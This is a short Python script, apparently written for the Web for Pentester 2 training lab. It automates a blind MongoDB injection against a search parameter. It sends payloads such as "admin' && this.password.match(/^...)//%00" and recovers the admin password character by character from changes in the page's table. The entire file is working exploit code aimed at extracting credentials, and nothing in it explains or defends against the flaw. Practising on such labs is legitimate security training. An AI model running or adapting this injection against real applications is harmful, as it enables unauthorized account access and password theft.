import requests, sys, string
from bs4 import BeautifulSoup

wfp2_site = sys.argv[1]

# url = f'''http://{wfp2_site}/mongodb/example2/?search=admin' %26%26 this.password.match(/^i/)//%00'''
url = f'''http://{wfp2_site}/mongodb/example2/?search='''
alpha_numeric = string.ascii_letters + string.digits

# resp = requests.get(url)
# soup = BeautifulSoup(resp.text, 'html.parser')

# Psuedocode for list:
# 1) Loop through every letter in alpha_numeric
# 2) Inject every letter for every loop,
#   2a) If 'admin' found, then letter is valid
#       * break out of loop
#       * include that in the URL
# 3) Check against a regex [a-zA-Z0-9] to check if password is completed
# Repeat steps 1-3 until checking regex [a-zA-Z0-9] returns 'admin not found'

pwd = ''
search_string = "admin' %26%26 this.password.match(/^{}{}/)//%00"
is_completed = "admin' %26%26 this.password.match(/^{}[a-zA-Z0-9]/)//%00"
done = False

while not done:
    for i in alpha_numeric:
        # search_string = "admin' %26%26 this.password.match(/^" + pwd + i + "/)//%00"

        resp = requests.get(url+search_string.format(pwd, i))
        soup = BeautifulSoup(resp.text, 'html.parser')

        if 'admin' in soup.find('table').getText():
            print(url + search_string.format(pwd, i) + " Matched!")
            pwd += i
            print('Current pass: ', pwd)
            break
        else:
            print(url + search_string.format(pwd, i) + " No match")

    # check to see if password is completed
    resp = requests.get(url + is_completed.format(pwd))
    soup = BeautifulSoup(resp.text, 'html.parser')

    if 'admin' not in soup.find('table').getText():
        print('Complete pass: ', pwd)
        done = True


#if ('admin' in soup.find('table').getText()):
    # print("admin found")
#else:
    # print("admin not found")